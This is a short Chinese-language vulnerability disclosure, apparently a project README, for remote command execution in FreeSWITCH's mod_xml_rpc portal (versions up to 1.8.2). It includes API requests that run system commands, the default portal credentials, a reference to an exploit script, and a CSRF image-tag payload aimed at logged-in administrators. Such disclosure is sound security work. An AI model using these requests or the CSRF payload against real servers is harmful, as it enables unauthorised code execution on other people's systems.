影响版本:<=1.8.2

漏洞模块:mod_xml_rpc

我总共测试了三个版本（各版本下载地址http://files.freeswitch.org/）

 - 1.8.2
 - 1.5.15
 - 1.7.0

# 1.5.15

安装freeswitch1.5.15 Windows版本（http://files.freeswitch.org/windows/installer/x64/freeswitch.msi）

打开控制台，输入：load mod_xml_rpc（加载freeswitch portal）

访问本地8080端口，

打开http://127.0.0.1:8080/portal/index.html 

在控制台输入
``` api("system calc") ```
或
``` api("bg_system calc") ```

![1](/files/1.png)

也可以直接请求接口

http://127.0.0.1:8080/txtapi/system?calc
或
http://127.0.0.1:8080/api/system?calc

![1](/files/2.png)


# 1.7.0

![1](/files/3.png)

![1](/files/4.png)


# exp

freeswitch portal的默认账号密码是freeswitch:works

你可以使用`freeswitch_rce.py`自行检测。

或者使用csrf的方式向已登录的管理员发起攻击。

```
<img src="http://127.0.0.1:8080/api/system?calc">
```

![1](/files/5.png)